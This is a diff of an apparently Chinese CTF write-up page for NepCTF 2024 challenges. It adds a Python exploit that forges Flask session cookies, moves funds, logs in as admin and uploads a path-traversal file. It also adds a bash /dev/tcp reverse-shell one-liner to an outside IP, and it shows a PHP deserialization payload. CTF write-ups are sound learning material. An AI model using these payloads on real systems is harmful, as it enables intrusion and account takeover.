@@ -204,7 +204,7 @@
 <span id="more"></span>
 
 <h1 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h1><p>直接ssti，只不过值是文件名。</p>
-<h1 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h1><p>这个是个套题。考查了</p>
+<h1 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h1><p>这个是个套题。</p>
 <pre><code class="php">&lt;?php
 highlight_file( __FILE__);
 error_reporting(0);
@@ -268,6 +268,7 @@ $ser = serialize(new C($_GET[&#39;c&#39;]));
 $data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);
 unserialize($data);
 </code></pre>
+<p>考察了：</p>
 <ul>
 <li>反序列化字符串逃逸</li>
 <li>反序列化结果<code>s</code>换<code>S</code>的十六进制格式</li>
@@ -334,11 +335,73 @@ echo urlencode($final_pay);
 O%3A1%3A%22C%22%3A2%3A%7Bs%3A1%3A%22s%22%3Bs%3A194%3A%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%001%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A5%3A%22+key+%22%3B%7Di%3A1%3Bs%3A8%3A%22readflag%22%3B%7D%7D%7D
 </code></pre>
 <h1 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h1><p>flasksession伪造一顿操作获得admin密码。</p>
+<p>exp</p>
+<pre><code class="python">import requests
+import io
+import os
+import json
+import time
+
+session = requests.Session()
+
+URL = &#39;https://neptune-15446.nepctf.lemonprefect.cn&#39;
+
+session.headers.update(&#123;
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36&#39;
+&#125;)
+
+try:
+    u_rep = requests.get(URL +&quot;/get_users&quot;)
+    if u_rep:
+        users_rep = json.loads(u_rep.text)
+
+        users = [
+            os.popen(f&#39;python3 /ctft/flask_session/w.py encode -s super_secret_key -t \&#39;&#123;json.dumps(&#123;&quot;username&quot;:users_rep[&quot;users&quot;][0]&#125;)&#125;\&#39;&#39;).read().strip(),
+            os.popen(f&#39;python3 /ctft/flask_session/w.py encode -s super_secret_key -t \&#39;&#123;json.dumps(&#123;&quot;username&quot;:users_rep[&quot;users&quot;][1]&#125;)&#125;\&#39;&#39;).read().strip(),
+        ]
+
+        for user_session in users:
+            session.cookies.clear()
+            session.cookies.set(&#39;session&#39;, user_session)
+
+            form_data = &#123;
+                &#39;amount&#39;: 2000,
+                &#39;receiver&#39;: &#39;HRP&#39;
+            &#125;
+            response = session.post(URL + &#39;/transfer&#39;, data=form_data)
+            
+            response.raise_for_status()
+            
+            print(f&#39;user : &#123;user_session&#125; success &#39;)
+            time.sleep(2)
+
+        session.cookies.clear()
+        session.post(url= URL + &#39;/login&#39;, data = &#123;&quot;username&quot;:&quot;HRP&quot;,&quot;password&quot;:&quot;HRP&quot;&#125;)
+        HRP_rep = session.get(url= URL + &quot;/buy_flag&quot;)
+        starts = HRP_rep.text.find(&#39;: &#39;)
+        flag = HRP_rep.text[starts:][2:17]
+        print(flag)
+        rep = session.post(url=URL + &#39;/admin&#39;, data=&#123;&#39;username&#39;:&#39;admin&#39;,&#39;password&#39;:flag&#125;)
+        if rep.status_code == 200:
+            print(&#39;admin login success&#39;)
+            files = &#123;
+                &#39;file&#39;: (&#39;../../lock.txt&#39;, io.BytesIO(&#39;yes&#39;.encode(&#39;utf-8&#39;)))
+            &#125;
+            rep = session.post(url=URL + &#39;/admin/dashboard&#39;, files=files)
+
+            if &quot;successfully&quot; in rep.text:
+                print(&quot;yes&quot;)
+    else:
+        print(f&#39;reponse is empty&#39;)
+
+except Exception as e:
+    print(e)
+</code></pre>
+<p>反弹<code>shell</code>：</p>
 <pre><code class="bash">nc -lvvp 23333
+
+bash -c &quot;bash -i &gt; /dev/tcp/47.94.179.6/23333 0&gt;&amp;1 2&gt;&amp;1&quot;
 </code></pre>
-<pre><code class="bash">bash -c &quot;bash -i &gt; /dev/tcp/47.94.179.6/23333 0&gt;&amp;1 2&gt;&amp;1&quot;
-</code></pre>
-<p>exp详见<code>/CTFpyenv/Exp/NepCTF_2024_boom</code></p>
 <p>学到了关于ps的新的东西：</p>
 <pre><code class="bash">ps -al
 
